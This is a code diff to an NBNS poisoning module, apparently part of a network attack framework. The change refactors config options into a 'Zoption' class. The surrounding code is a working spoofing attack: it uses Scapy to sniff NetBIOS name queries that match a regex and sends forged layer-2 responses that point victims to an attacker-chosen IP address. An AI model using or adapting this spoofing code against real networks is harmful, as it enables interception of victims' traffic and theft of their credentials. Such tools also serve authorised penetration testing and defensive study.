@@ -1,6 +1,7 @@
 import re
 from threading import Thread
 from scapy.all import *
+from zoption import Zoption
 from poison import Poison
 import util
 import config
@@ -11,14 +12,14 @@ class nbns(Poison):
         super(nbns, self).__init__('NBNS Poison')
         conf.verb = 0
         self.local_mac = get_if_hwaddr(config.get('iface'))
-        self.config.update({"regex_match":{"type":"regex", 
-                                           "value":None,
-                                           "required":True, 
-                                           "display":"Match request regex"},
-                            "redirect":{"type":"ip", 
-                                        "value":None,
-                                        "required":True, 
-                                        "display":"Redirect to"}
+        self.config.update({"regex_match":Zoption(type = "regex", 
+                                           value = None,
+                                           required = True, 
+                                           display = "Match request regex"),
+                            "redirect":Zoption(type = "ip", 
+                                        value = None,
+                                        required = True, 
+                                        display = "Redirect to")
                            })
         self.info = """
                     Implements NBNS spoofing.
@@ -29,7 +30,7 @@ class nbns(Poison):
         """Callback for packets"""
         if pkt.haslayer(NBNSQueryRequest):
             request = pkt[NBNSQueryRequest].getfieldval('QUESTION_NAME')
-            ret = self.config['regex_match']['value'].search(request.lower())
+            ret = self.config['regex_match'].value.search(request.lower())
             if ret is None:
                 return
 
@@ -39,7 +40,7 @@ class nbns(Poison):
                 response = Ether(dst=pkt[Ether].src, src=self.local_mac)
                 response /= IP(dst=pkt[IP].src) / UDP(sport=137, dport=137)
                 response /= NBNSQueryResponse(NAME_TRN_ID=trans_id,
-                  RR_NAME=request, NB_ADDRESS=self.config['redirect']['value'])
+                  RR_NAME=request, NB_ADDRESS=self.config['redirect'].value)
                 del response[UDP].chksum  # recalc checksum
                 sendp(response)    # layer 2 send for performance
                 self.log_msg('Spoofing \'%s\' from %s'
@@ -68,5 +69,5 @@ class nbns(Poison):
 
     def session_view(self):
         """Override session viewer"""
-        return '%s -> %s' % (self.config['regex_match']['value'].pattern,
-                self.config['redirect']['value'])
+        return '%s -> %s' % (self.config['regex_match'].getStr(),
+                self.config['redirect'].value)
